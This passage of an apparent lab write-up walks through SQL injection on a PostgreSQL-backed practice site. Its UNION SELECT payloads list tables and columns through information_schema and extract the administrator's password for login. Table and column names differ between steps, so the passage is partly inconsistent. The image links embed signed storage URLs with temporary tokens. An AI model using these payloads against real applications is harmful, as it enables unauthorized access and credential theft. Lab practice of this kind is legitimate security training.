# Listing the database contents on non-Oracle databases.

**both column 1 and 2 contain data type string.**

**STEP #3**

Query the database to retrieve database type.

```text
' UNION SELECT version(), NULL--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/e18d5687-f060-464c-b24e-b96b3edd6468/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664KILWHYL%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGlyYOzSdtMXH9bsBJngAHT88W2dyc0a9yc7iubxzrLxAiBFFJDJhQm1ER7txLYGF0J0PYEnzKLooSE0HrqWussuFiqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMzEAmBWuV3UTCWbi%2BKtwDhwhlroGfOwlkB2Vw%2BmqT9Uuq1zuxYpUY8S4CYbPlB8%2BTXElyd2CPaP8YDUseinvMVIyvKHlTiyfWGqi5sR2q8gy%2F9TTPQ1Sipk79PqKo4w3eouaDRZqb9vlTnXmrTd4ngjZ1v%2FydZAbHt%2BEs2USkXkyRBcP4OiSeW3xlfRPQF7YdtRqT%2B1hd8aIQRNIwgLu20uTCaqD5hgMLiAB0WeUztyrvPzzushzDKQiSMr2beg4Qlhecb5hHxx4Ys6lAcVNf8a5RXaGwVzqHkcqnn%2BdxaPug1zmafOf3DZyhMS%2B1TC2sPRIpuRiMR6rz17yJ%2FDbMifgeJeb62uY8N1p2%2B886cHbhIMKKiEgWZc6cI7H%2FUyVdCb4zxsRzrkRGGLfclcYoZ2oGjjNzx8cm1eopLY%2F8aLLgbiJGFF648R3H5Obut%2BquY17Nv7ZCcK0o06LSiAcasff3iUJ3iXXmS7BeM069iC7swY1NktCGQxl9JxHhs8GeqW1Uwk1aIJCnY2a9XkNNOm99bW5g7e1FXPj9Uai1ETvXautYzuWDOYMnBQUA4dNdLPBICPOMgp03AeZ75oe7yMv5b3r7JTLIOD0Y%2Fv7KnWhe7a4z4QdAKZvkKbp4k1VlV%2FLu7J8EAdUh1a8w5Mai1AY6pgGgxhsGYEtW0ji2%2BZ4uPyGW1nKP7EjODhQCrc7I40c0fabp02uRBQS9gLGC3N%2FuhFcaR83up9Yydxmrtt%2FZmiSmW9X%2BmvS4aQo3kBrLJPXNqutYyCsq1X2kyE4rxmWpAA5c2U20bEUcbxeEIZ75byPbAwAIzoJ%2BGw1nsBoYSWyHuyepvkWDaJhaHg50B7%2FQr1mMwhInQsvDAl4iKQRZBdF%2Biu4AfEYh&X-Amz-Signature=6c0380f219e0a445e91fb55d84e5f456186be8a0ae29ae7c002f4be110349e75&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**It returns:**

```text
PostgreSQL 11.12 (Debian 11.12–1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0–18+deb9u1) 6.3.0 20170516, 64-bit
```

**Database type: PostgreSQL**

**STEP #4**

Determine the table names.

![](https://miro.medium.com/v2/resize:fit:700/0*4vUM6NT3J_FxIyFW)

```text
' UNION SELECT table_name, NULL FROM information_schema.tables
```

![](https://miro.medium.com/v2/resize:fit:700/0*5_92Rm85mDwlIX-Z)

Let’s search for a table that contains usernames and passwords.

![](https://miro.medium.com/v2/resize:fit:700/0*JfNplyrNCXGFTbAd)

There is a table named `users_wfixez`** **this might be the table we are looking for. So let’s try retrieving columns of that table.

**STEP #5**

Determine the column names of the table `users_wfixez`

```text
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_wfixez'--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/cfe0361c-45a8-48ec-a043-1c0b65e51441/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664KILWHYL%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGlyYOzSdtMXH9bsBJngAHT88W2dyc0a9yc7iubxzrLxAiBFFJDJhQm1ER7txLYGF0J0PYEnzKLooSE0HrqWussuFiqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMzEAmBWuV3UTCWbi%2BKtwDhwhlroGfOwlkB2Vw%2BmqT9Uuq1zuxYpUY8S4CYbPlB8%2BTXElyd2CPaP8YDUseinvMVIyvKHlTiyfWGqi5sR2q8gy%2F9TTPQ1Sipk79PqKo4w3eouaDRZqb9vlTnXmrTd4ngjZ1v%2FydZAbHt%2BEs2USkXkyRBcP4OiSeW3xlfRPQF7YdtRqT%2B1hd8aIQRNIwgLu20uTCaqD5hgMLiAB0WeUztyrvPzzushzDKQiSMr2beg4Qlhecb5hHxx4Ys6lAcVNf8a5RXaGwVzqHkcqnn%2BdxaPug1zmafOf3DZyhMS%2B1TC2sPRIpuRiMR6rz17yJ%2FDbMifgeJeb62uY8N1p2%2B886cHbhIMKKiEgWZc6cI7H%2FUyVdCb4zxsRzrkRGGLfclcYoZ2oGjjNzx8cm1eopLY%2F8aLLgbiJGFF648R3H5Obut%2BquY17Nv7ZCcK0o06LSiAcasff3iUJ3iXXmS7BeM069iC7swY1NktCGQxl9JxHhs8GeqW1Uwk1aIJCnY2a9XkNNOm99bW5g7e1FXPj9Uai1ETvXautYzuWDOYMnBQUA4dNdLPBICPOMgp03AeZ75oe7yMv5b3r7JTLIOD0Y%2Fv7KnWhe7a4z4QdAKZvkKbp4k1VlV%2FLu7J8EAdUh1a8w5Mai1AY6pgGgxhsGYEtW0ji2%2BZ4uPyGW1nKP7EjODhQCrc7I40c0fabp02uRBQS9gLGC3N%2FuhFcaR83up9Yydxmrtt%2FZmiSmW9X%2BmvS4aQo3kBrLJPXNqutYyCsq1X2kyE4rxmWpAA5c2U20bEUcbxeEIZ75byPbAwAIzoJ%2BGw1nsBoYSWyHuyepvkWDaJhaHg50B7%2FQr1mMwhInQsvDAl4iKQRZBdF%2Biu4AfEYh&X-Amz-Signature=b0be14f703743f41c68af7a0ec1fed51d7e011b5e0e596296e22f9cab976da32&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**There are two columns in the table **`users_hwlzhs`**.**

`username_wbdvqp`

`password_zfxnbv`

**STEP #6**

Retrieve the administrator’s password from the database.

```text
'+UNION+SELECT+password_xvbkii,username_wwmyan+FROM+users_wfixez--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/a70b723f-9acb-4142-81e1-e06c44bcadef/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664KILWHYL%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGlyYOzSdtMXH9bsBJngAHT88W2dyc0a9yc7iubxzrLxAiBFFJDJhQm1ER7txLYGF0J0PYEnzKLooSE0HrqWussuFiqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMzEAmBWuV3UTCWbi%2BKtwDhwhlroGfOwlkB2Vw%2BmqT9Uuq1zuxYpUY8S4CYbPlB8%2BTXElyd2CPaP8YDUseinvMVIyvKHlTiyfWGqi5sR2q8gy%2F9TTPQ1Sipk79PqKo4w3eouaDRZqb9vlTnXmrTd4ngjZ1v%2FydZAbHt%2BEs2USkXkyRBcP4OiSeW3xlfRPQF7YdtRqT%2B1hd8aIQRNIwgLu20uTCaqD5hgMLiAB0WeUztyrvPzzushzDKQiSMr2beg4Qlhecb5hHxx4Ys6lAcVNf8a5RXaGwVzqHkcqnn%2BdxaPug1zmafOf3DZyhMS%2B1TC2sPRIpuRiMR6rz17yJ%2FDbMifgeJeb62uY8N1p2%2B886cHbhIMKKiEgWZc6cI7H%2FUyVdCb4zxsRzrkRGGLfclcYoZ2oGjjNzx8cm1eopLY%2F8aLLgbiJGFF648R3H5Obut%2BquY17Nv7ZCcK0o06LSiAcasff3iUJ3iXXmS7BeM069iC7swY1NktCGQxl9JxHhs8GeqW1Uwk1aIJCnY2a9XkNNOm99bW5g7e1FXPj9Uai1ETvXautYzuWDOYMnBQUA4dNdLPBICPOMgp03AeZ75oe7yMv5b3r7JTLIOD0Y%2Fv7KnWhe7a4z4QdAKZvkKbp4k1VlV%2FLu7J8EAdUh1a8w5Mai1AY6pgGgxhsGYEtW0ji2%2BZ4uPyGW1nKP7EjODhQCrc7I40c0fabp02uRBQS9gLGC3N%2FuhFcaR83up9Yydxmrtt%2FZmiSmW9X%2BmvS4aQo3kBrLJPXNqutYyCsq1X2kyE4rxmWpAA5c2U20bEUcbxeEIZ75byPbAwAIzoJ%2BGw1nsBoYSWyHuyepvkWDaJhaHg50B7%2FQr1mMwhInQsvDAl4iKQRZBdF%2Biu4AfEYh&X-Amz-Signature=fddb8161f7bf7551e42d5b557b8b7612db2873af847129667d5ccc6bf5c1dfe1&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

| 9kn123cwvo54vzhicsns | administrator |
Use the administrator’s password to gain administrator’s access to the web application.

